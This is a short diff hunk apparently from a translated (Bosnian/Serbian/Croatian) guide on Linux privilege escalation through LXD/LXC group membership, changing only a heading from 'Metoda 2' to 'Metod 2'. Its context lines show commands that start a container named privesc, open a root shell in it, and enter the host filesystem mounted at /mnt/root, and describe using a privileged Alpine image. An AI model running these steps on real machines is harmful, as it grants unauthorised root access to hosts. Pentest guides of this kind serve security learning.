@@ -58,7 +58,7 @@ lxc start privesc
 lxc exec privesc /bin/sh
 [email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
 ```
-### Metoda 2
+### Metod 2
 
 Izgradite Alpine sliku i pokrenite je koristeći flag `security.privileged=true`, prisiljavajući kontejner da komunicira kao root sa host datotečnim sistemom.
 ```bash
